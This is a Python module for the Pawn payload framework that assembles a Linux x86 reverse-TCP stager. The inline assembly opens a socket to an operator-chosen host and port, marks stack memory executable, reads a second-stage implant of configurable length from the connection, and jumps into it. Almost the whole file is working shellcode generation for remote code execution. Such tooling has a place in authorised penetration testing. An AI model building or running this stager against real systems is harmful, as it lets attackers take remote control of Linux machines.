"""
This module requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
"""

from textwrap import dedent

from pex.assembler import Assembler

from pawn.lib.module import *


class PawnModule(Module, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "linux/x86/reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer'
            ],
            'Arch': ARCH_X86,
            'Platform': OS_LINUX,
            'Type': "reverse_tcp",
        })

        self.host = IPv4Option(None, 'Host to connect to.', True)
        self.port = PortOption(None, 'Port to connect to.', True)
        self.length = IntegerOption(4096, 'Length of the implant.', True)
        self.reliable = BooleanOption('yes', 'Make payload reliable.', True)

    def run(self):
        length = self.length.value

        if length % 0x100 == 0x7 and length <= 0xff07:
            length = length / 0x100
            reg = 'dh'
        elif length < 0x100:
            reg = 'dl'
        elif length < 0x10000:
            reg = 'dx'
        else:
            reg = 'edx'

        payload = dedent(f"""\
        start:
            xor  ebx, ebx
            mul  ebx
            push ebx
            inc  ebx
            push ebx
            push 0x2
            mov  al, 0x66
            mov  ecx, esp
            int  0x80

            xchg edi, eax

            pop  ebx
            push 0x{self.host.little.hex()}
            push 0x{self.port.little.hex()}0002
            mov  ecx, esp

            push 0x66
            pop  eax
            push eax
            push ecx
            push edi
            mov  ecx, esp
            inc  ebx
            int  0x80
        """)

        if self.reliable.value:
            payload += dedent("""\
                test eax, eax
                js   fail
            """)

        payload += dedent(f"""\
            mov dl, 0x7
            mov ecx, 0x1000
            mov ebx, esp
            shr ebx, 0xc
            shl ebx, 0xc
            mov al, 0x7d
            int 0x80
        """)

        if self.reliable.value:
            payload += dedent("""\
                test eax, eax
                js   fail
            """)

        payload += dedent(f"""\
            pop ebx
            mov ecx, esp
            cdq
            mov {reg}, {hex(length)}
            mov al, 0x3
            int 0x80
        """)

        if self.reliable.value:
            payload += dedent("""\
                test eax, eax
                js   fail
            """)

        payload += dedent("""\
            jmp ecx
        """)

        if self.reliable.value:
            payload += dedent("""\
            fail:
                mov eax, 0x1
                mov ebx, 0x0
                int 0x80
            """)

        return self.assemble(
            self.details['Arch'], payload)
